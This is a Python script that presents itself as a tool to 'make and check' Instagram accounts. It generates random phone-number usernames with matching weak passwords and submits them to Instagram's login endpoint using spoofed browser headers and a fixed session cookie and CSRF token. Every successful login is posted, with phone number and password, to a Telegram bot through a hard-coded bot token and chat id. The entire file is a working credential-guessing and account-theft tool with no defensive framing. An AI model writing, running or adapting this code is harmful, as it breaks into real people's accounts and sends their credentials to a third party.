import requests , random , time , os
from user_agent import *
I = ("5497242163")
T = ("6374462782:AAGp-yeYIAkn9rTSX8auiA6erA2LVp25EAY")
print('''\n\r
⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔
- Hello Man , 
- The Tool ( Make And Check [ Account Instagram .]) num:num ,
- You Need ( Token & Id ) ,
- Programing Tool ( Kabos - @nnkonn ) .
⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔

''')
time.sleep(2)
os.system('clear')
def checker():
    while True:
        time.sleep(2)
        N = "09876543221"
        R = ''.join(random.choice(N)for t in range(7))
        Username = '98912'+R
        Password = R
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {
        
        
        'accept':'*/*',
        'accept-language':'en-US,en;q=0.9',
        'content-length':'378',
        'content-type':'application/x-www-form-urlencoded',
        'cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
        'origin':'https://www.instagram.com',
        'referer':'https://www.instagram.com/',
        'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'sec-ch-ua-mobile':'?0',
        'x-asbd-id':'198387',
        'user-agent': generate_user_agent(),
        'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
        'x-ig-app-id':'936619743392459',
        'x-ig-www-claim':'0',
        'x-instagram-ajax':'3bcc4d0b0733',
        'x-requested-with':'XMLHttpRequest',
        }
        data = {
       'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(Password),
        'username':Username,
        }
        respone = requests.post(url,headers=headers,data=data).text
        if "userId" in respone:            
            print(f"[-] Successful Account ✅ | Username : {Username} - Password : {Password}")
            aC = f'''- New Successful Account ✅.
    ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔
    ⌔ Phone : {Username}
    ⌔ Password : {Password}
    ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ 
    ⌔ Developer : @nnkonn .'''
            requests.post(f'https://api.telegram.org/bot{T}/sendMessage?chat_id={I}&text={aC}')
        else:
            print(f"[-] Erorr Account ❌ | Username : {Username} - Password : {Password}")
            
            
checker()
